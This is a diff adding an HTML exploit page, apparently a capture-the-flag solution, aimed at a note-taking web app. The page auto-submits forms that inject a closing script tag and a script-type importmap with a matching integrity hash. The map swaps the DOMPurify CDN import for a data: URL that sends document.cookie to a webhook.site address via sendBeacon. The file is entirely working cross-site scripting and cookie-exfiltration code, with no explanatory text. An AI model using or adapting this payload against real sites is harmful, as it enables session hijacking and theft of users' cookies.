@@ -1,0 +1,56 @@
+<body>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+  <script>
+    const BASE_URL = "http://web:3000";
+
+    // Edit this URL
+    const HOOK_URL = "https://webhook.site/xxxxx";
+
+    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+    const getIntegrity = (content) => {
+      const value = CryptoJS.enc.Base64.stringify(CryptoJS.SHA256(content));
+      return `sha256-${value}`;
+    };
+
+    const createNote = async (body) => {
+      const form = document.createElement("form");
+      form.action = `${BASE_URL}/create`;
+      form.method = "post";
+      form.target = "_blank";
+      for (const [key, value] of Object.entries(body)) {
+        const input = document.createElement("input");
+        input.name = key;
+        input.value = value;
+        form.appendChild(input);
+      }
+      document.body.appendChild(form);
+      form.submit();
+    };
+
+    const dataUrl = `data:text/javascript,export default navigator.sendBeacon("${HOOK_URL}", document.cookie)`;
+
+    const cdnUrl = "https://cdn.jsdelivr.net/npm/dompurify@3.1.6/+esm";
+
+    // ref. https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap
+    const importMap = { imports: { [cdnUrl]: dataUrl } };
+
+    (async () => {
+      createNote({
+        title: "x",
+        content:
+          "</" +
+          `script><script type=importmap integrity=${getIntegrity(
+            JSON.stringify(importMap)
+          )} x=`,
+      });
+      await sleep(1000);
+
+      createNote({
+        [`imports[${cdnUrl}]`]: dataUrl,
+      });
+      await sleep(1000);
+    })();
+  </script>
+</body>
